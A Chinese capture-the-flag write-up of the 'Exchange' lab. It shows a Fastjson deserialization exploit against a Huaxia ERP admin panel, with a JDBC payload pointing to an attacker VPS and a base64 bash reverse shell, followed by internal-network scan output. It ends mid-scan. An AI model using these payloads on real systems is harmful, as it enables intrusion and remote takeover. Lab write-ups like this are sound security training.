+++
date = '2025-04-08T23:02:55+08:00'
title = '春秋云境-Exchange-Writeup'
categories = ["Writeup"]
tags = ["writeup", "渗透", "春秋云镜"]

+++



*靶标介绍：*

Exchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。



### FLAG1

首先用fscan信息收集一手

```cmd
 .\fscan.exe -h 39.98.127.105 -p 1-65535

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.1
start infoscan
(icmp) Target 39.98.127.105   is alive
[*] Icmp alive hosts len is: 1
39.98.127.105:80 open
39.98.127.105:22 open
39.98.127.105:8000 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle:http://39.98.127.105      code:200 len:19813  title:lumia
[*] WebTitle:http://39.98.127.105:8000 code:302 len:0      title:None 跳转url: http://39.98.127.105:8000/login.html
[*] WebTitle:http://39.98.127.105:8000/login.html code:200 len:5662   title:Lumia ERP
已完成 3/3
[*] 扫描结束,耗时: 5m26.1641278s
```

80端口是一个介绍产品的网站

![image-20250408231422505](../assets/image-20250408231422505.png)

8000端口应该是网站的后台

![image-20250408231526945](../assets/image-20250408231526945.png)

看到后台可以注册用户，我们注册一个

![image-20250408232901718](../assets/image-20250408232901718.png)

成功进入后台

华夏ERP v2.3存在一处fastjson反序列化漏洞

[Java 代码审计之华夏 ERP CMS v2.3 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/347135.html)

![image-20250408234119162](../assets/image-20250408234119162.png)

`Fastjson`版本是 1.2.55

构造dns请求验证一下

```
{"@type":"java.net.Inet4Address","val":"ysgbayuskh.iyhc.eu.org"}
```

![image-20250408234842947](../assets/image-20250408234842947.png)

验证漏洞

这里我们可以通过evil-mysql-server和ysoserial构造恶意mysql服务打jdbc

```
./evil-mysql-server -addr 3366 -java java -ysoserial ysoserial-all.jar
```

exp

```
{
	"name": {
		"@type": "java.lang.AutoCloseable",
		"@type": "com.mysql.jdbc.JDBC4Connection",
		"hostToConnectTo": "vpsIP地址",
		"portToConnectTo": 3366,
		"info": {
			"user": "yso_CommonsCollections6_bash -c {echo,base64编码后的命令}|{base64,-d}|{bash,-i}",
			"password": "pass",
			"statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
			"autoDeserialize": "true",
			"NUM_HOSTS": "1"
		}
	}

```

成功弹shell

![image-20250409004552548](../assets/image-20250409004552548.png)

有root权限，直接读flag

```cmd
root@iZ8vb6bns5dh59k418a97hZ:/root/flag# cat f*
cat f*
 ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ 
░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
 ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ 
  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         
   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████
  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██
 ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ 
░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  

                        |  |  ||  | /~~\  /\  |\  /|~|~
                        |  |  ||--||    |/__\ | \/ | | 
                         \/ \/ |  | \__//    \|    |_|_

              flag01: flag{f605c397-0df7-4f55-b013-c7e45be124d0}
```



### FLAG2

```
root@iZ8vb6bns5dh59k418a97hZ:/tmp# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:1c:80:b4 brd ff:ff:ff:ff:ff:ff
    inet 172.22.3.12/16 brd 172.22.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe1c:80b4/64 scope link 
       valid_lft forever preferred_lft forever
```

传个fscan信息收集一波

```cmd
root@iZ8vb6bns5dh59k418a97hZ:/tmp# ./fscan -h 172.22.3.0/24 -eh 172.22.3.12 -p 1-65535
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-04-09 00:51:47] [INFO] 暴力破解线程数: 1
[2025-04-09 00:51:47] [INFO] 开始信息扫描
[2025-04-09 00:51:47] [INFO] CIDR范围: 172.22.3.0-172.22.3.255
[2025-04-09 00:51:47] [INFO] 生成IP范围: 172.22.3.0.%!d(string=172.22.3.255) - %!s(MISSING).%!d(MISSING)
[2025-04-09 00:51:47] [INFO] 解析CIDR 172.22.3.0/24 -> IP范围 172.22.3.0-172.22.3.255
[2025-04-09 00:51:48] [INFO] 已排除指定主机: 1 个
[2025-04-09 00:51:48] [INFO] 最终有效主机数量: 255
[2025-04-09 00:51:48] [INFO] 开始主机扫描
[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.2      存活 (ICMP)
[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.26     存活 (ICMP)
[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.9      存活 (ICMP)
[2025-04-09 00:51:51] [INFO] 存活主机数量: 3
[2025-04-09 00:51:51] [INFO] 有效端口数量: 65535
[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:25
[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:53
[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:80
[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:88
[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:81
[2025-04-09 00:51:51] [SUCCESS] 服务识别 172.22.3.9:25 => [smtp] 产品:Microsoft Exchange smtpd 系统:Windows
[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:135
[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.9:135
[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.26:139
[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.9:139
[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.2:139
[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.26:135
[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.2:389
[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:445
[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.26:445
[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:444
[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.2:445
[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:443
[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:465
[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:464
[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:477
[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:476
[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:475
[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:465 => [smtp] 产品:Microsoft Exchange smtpd 系统:Windows
[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.2:88 => 
[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:477 => [smtp]
[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:476 => [smtp]
[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:475 => [smtp]
[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:587
[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:593
[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:593
[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:81 => [http]
[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:636
[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:587 => [smtp] 产品:Microsoft Exchange smtpd 系统:Windows
[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:717
[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.2:593 => [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0]
[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:593 => [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0]
[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.2:636 => 
[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:808
[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:890
[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:717 => [smtp] 产品:Microsoft Exchange smtpd 系统:Windows
[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.26:139 =>  Banner:[.]
[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:139 =>  Banner:[.]
[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.2:139 =>  Banner:[.]
[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:1801
[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:80 => [http] 版本:10.0 产品:Microsoft IIS httpd 系统:Windows
[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:2103
[2025-04-09 00:51:58] [SUCCESS] 端口开放 172.22.3.9:2107
[2025-04-09 00:51:58] [SUCCESS] 端口开放 172.22.3.9:2105
[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.2:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.9:445 => 
[2025-04-09 00:52:00] [SUCCESS] 端口开放 172.22.3.9:2525
[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.26:445 => 
[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.9:2525 => [smtp] 产品:Microsoft Exchange smtpd 系统:Windows
[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.2:445 => 
[2025-04-09 00:52:00] [SUCCESS] 端口开放 172.22.3.2:3268
[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.2:3269
[2025-04-09 00:52:01] [SUCCESS] 服务识别 172.22.3.2:3269 => 
[2025-04-09 00:52:01] [SUCCESS] 服务识别 172.22.3.2:464 => 
[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.2:3389
[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.26:3389
[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.9:3389
[2025-04-09 00:52:02] [SUCCESS] 服务识别 172.22.3.9:808 => 
[2025-04-09 00:52:02] [SUCCESS] 服务识别 172.22.3.9:890 => 
[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3800
[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3801
[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3803
[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3823
[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3828
[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3843
[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3863
[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3867
[2025-04-09 00:52:03] [SUCCESS] 端口开放 172.22.3.9:3875
[2025-04-09 00:52:05] [SUCCESS] 服务识别 172.22.3.2:3268 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
[2025-04-09 00:52:06] [SUCCESS] 服务识别 172.22.3.26:3389 => 
[2025-04-09 00:52:06] [SUCCESS] 端口开放 172.22.3.9:5060
[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:5062
[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:5065
[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3801 => 
[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3803 => 
[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:1801 => 
[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3823 => 
[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3828 => 
[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3843 => 
[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3863 => 
[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3867 => 
[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6001
[2025-04-09 00:52:08] [SUCCESS] 服务识别 172.22.3.9:6001 => [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0]
[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6027
[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6049
[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6057
[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6081
[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6095
[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6102
[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6119
[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6129
[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6153
[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6193
[2025-04-09 00:52:09] [SUCCESS] 端口开放 172.22.3.9:6228
[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6401
[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6405
[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6400
[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6404
[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6430
[2025-04-09 00:52:11] [SUCCESS] 服务识别 172.22.3.9:5060 => 
[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6448
[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6449
[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6454
[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6490
[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6492
[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6497
[2025-04-09 00:52:12] [SUCCESS] 服务识别 172.22.3.9:3800 => [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows
[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6512
[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6514
[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6548
[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6550
[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6560
[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6571
[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6564
[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6570
[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6572
[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6578
[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6590
[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6594
[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6606
[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6616
[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6621
[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6624
[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6642
[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6664
[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6685
[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6690
[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6719
[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6728
[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6741
[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6770
[2025-04-09 00:52:17] [SUCCESS] 服务识别 172.22.3.9:5062 => 
[2025-04-09 00:52:17] [SUCCESS] 服务识别 172.22.3.9:5065 => 
[2025-04-09 00:52:17] [SUCCESS] 端口开放 172.22.3.9:6772
[2025-04-09 00:52:18] [SUCCESS] 端口开放 172.22.3.9:7673
[2025-04-09 00:52:19] [SUCCESS] 服务识别 172.22.3.9:6664 => 
[2025-04-09 00:52:20] [SUCCESS] 端口开放 172.22.3.9:8172
[2025-04-09 00:52:51] [SUCCESS] 服务识别 172.22.3.2:53 => 
[2025-04-09 00:52:52] [SUCCESS] 端口开放 172.22.3.2:9389
[2025-04-09 00:52:53] [SUCCESS] 服务识别 172.22.3.9:2103 => 
[2025-04-09 00:52:53] [SUCCESS] 端口开放 172.22.3.9:9710
[2025-04-09 00:52:53] [SUCCESS] 服务识别 172.22.3.9:2107 => 
[2025-04-09 00:52:55] [SUCCESS] 端口开放 172.22.3.9:12393
[2025-04-09 00:52:55] [SUCCESS] 服务识别 172.22.3.9:444 => 
[2025-04-09 00:52:56] [SUCCESS] 服务识别 172.22.3.2:135 => 
[2025-04-09 00:52:57] [SUCCESS] 端口开放 172.22.3.26:15774
[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.2:9389 => 
[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.9:135 => 
[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.26:135 => 
[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:9710 => 
[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:3875 => 
[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:2105 => 
[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6027 => 
[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6049 => 
[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6057 => 
[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6081 => 
[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6095 => 
[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6102 => 
[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6119 => 
[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6129 => 
[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6153 => 
[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6193 => 
[2025-04-09 00:53:04] [SUCCESS] 服务识别 172.22.3.9:6228 => 
[2025-04-09 00:53:05] [SUCCESS] 服务识别 172.22.3.9:12393 => 
[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6401 => 
[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6405 => 
[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6400 => 
[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.2:3389 => 
[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6404 => 
[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6430 => 
[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:3389 => 
[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6448 => 
[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.26:15774 => 
[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6449 => 
[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6454 => 
[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6490 => 
[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6492 => 
[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6497 => 
[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6512 => 
[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6514 => 
[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6548 => 
[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6550 => 
[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6571 => 
[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6564 => 
[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6570 => 
[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6572 => 
[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6578 => 
[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6590 => 
[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6594 => 
[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6606 => 
[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6616 => 
[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6621 => 
[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6624 => 
[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6642 => 
[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6685 => 
[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6690 => 
[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6719 => 
[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6728 => 
[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6741 => 
[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6770 => 
[2025-04-09 00:53:12] [SUCCESS] 服务识别 172.22.3.9:6772 => 
[2025-04-09 00:53:13] [SUCCESS] 服务识别 172.22.3.9:7673 => 
[2025-04-09 00:53:13] [SUCCESS] 服务识别 172.22.3.9:6560 => 
[2025-04-09 00:53:15] [SUCCESS] 服务识别 172.22.3.9:8172 => 
[2025-04-09 00:53:20] [SUCCESS] 服务识别 172.22.3.9:443 => 
[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.2:47001
[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.26:47001
[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.9:47001
[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.2:47001 => [http]
[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.9:47001 => [http]
[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.26:47001 => [http]
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49665
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49664
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49667
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49664
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49666
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49667
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49666
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49665
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49668
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49669
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49670
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49671
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49673
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49674
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49675
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49677
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49678
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49684
[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49695
[2025-04-09 00:53:39] [SUCCESS] 服务识别 172.22.3.2:49674 => [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0]
[2025-04-09 00:53:55] [SUCCESS] 端口开放 172.22.3.2:52352
[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49665 => 
[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49664 => 
[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49667 => 
[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49664 => 
[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49666 => 
[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49667 => 
[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49666 => 
[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49665 => 
[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49668 => 
[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49669 => 
[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49670 => 
[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49671 => 
[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49673 => 
[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49675 => 
[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49677 => 
[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49678 => 
[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49684 => 
[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49695 => 
[2025-04-09 00:54:46] [SUCCESS] 端口开放 172.22.3.9:64327
[2025-04-09 00:54:46] [SUCCESS] 端口开放 172.22.3.9:64337
[2025-04-09 00:54:50] [SUCCESS] 服务识别 172.22.3.2:52352 => 
[2025-04-09 00:54:51] [SUCCESS] 服务识别 172.22.3.9:64337 => 
[2025-04-09 00:55:41] [SUCCESS] 服务识别 172.22.3.9:64327 => 
[2025-04-09 00:55:41] [INFO] 存活端口数量: 130
[2025-04-09 00:55:41] [INFO] 开始漏洞扫描
[2025-04-09 00:55:41] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, rdp, smb, smb2, smbghost, smtp, webpoc, webtitle
[2025-04-09 00:55:41] [SUCCESS] 网站标题 http://172.22.3.9         状态码:403 长度:0      标题:无标题
[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.3.9
主机名: XIAORANG-EXC01
发现的网络接口:
   IPv4地址:
      └─ 172.22.3.9
[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.3.2
主机名: XIAORANG-WIN16
发现的网络接口:
   IPv4地址:
      └─ 172.22.3.2
[2025-04-09 00:55:41] [INFO] 系统信息 172.22.3.2 [Windows Server 2016 Datacenter 14393]
[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.26     XIAORANG\XIAORANG-PC          
[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.2      DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393
[2025-04-09 00:55:41] [SUCCESS] 网站标题 http://172.22.3.9:81      状态码:403 长度:1157   标题:403 - 禁止访问: 访问被拒绝。
[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.3.26
主机名: XIAORANG-PC
